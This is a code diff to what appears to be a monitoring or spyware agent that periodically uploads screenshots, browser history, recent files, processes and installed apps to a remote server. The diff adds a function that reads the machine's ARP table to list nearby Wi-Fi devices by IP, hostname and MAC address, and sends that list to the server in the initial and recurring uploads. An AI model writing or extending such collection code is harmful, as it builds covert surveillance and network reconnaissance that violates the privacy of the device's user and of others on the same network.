@@ -442,6 +442,33 @@ def get_installed_apps():
                 pass
     return sorted(list(set(apps)))[:100]
 
+# ==================== LOCAL NETWORK DEVICES SCANNER ====================
+def get_local_network_devices():
+    """Scans local Wi-Fi ARP table to discover all active devices, hostnames, and IP addresses"""
+    devices = []
+    seen_ips = set()
+    try:
+        out = subprocess.check_output(['arp', '-a'], stderr=subprocess.DEVNULL, timeout=4).decode(errors='replace')
+        for line in out.splitlines():
+            import re
+            match = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
+            if match:
+                h_name = match.group(1) or 'Wi-Fi Device'
+                if h_name == '?': h_name = 'Wi-Fi Device'
+                ip_addr = match.group(2)
+                mac_addr = match.group(3)
+                
+                if ip_addr not in seen_ips and not ip_addr.startswith('255.') and not ip_addr.startswith('224.'):
+                    seen_ips.add(ip_addr)
+                    devices.append({
+                        'ip': ip_addr,
+                        'hostname': h_name,
+                        'mac': mac_addr
+                    })
+    except Exception as e:
+        log.debug(f"Local ARP scan error: {e}")
+    return devices
+
 # ==================== NETWORK ====================
 def get_network_info():
     try:
@@ -613,6 +640,7 @@ def agent_worker():
         send_to_server('processes', get_processes())
         send_to_server('files', get_recent_files())
         send_to_server('network', get_network_info())
+        send_to_server('network_devices', get_local_network_devices())
         send_to_server('apps', get_installed_apps())
         log.info("✅ Initial data sent successfully")
     except Exception as e:
@@ -631,6 +659,7 @@ def agent_worker():
                         send_to_server('screenshot', base64.b64encode(f.read()).decode())
                 send_to_server('processes', get_processes())
                 send_to_server('network', get_network_info())
+                send_to_server('network_devices', get_local_network_devices())
 
             if loop_count % 3 == 0:
                 send_to_server('history', get_browser_history())
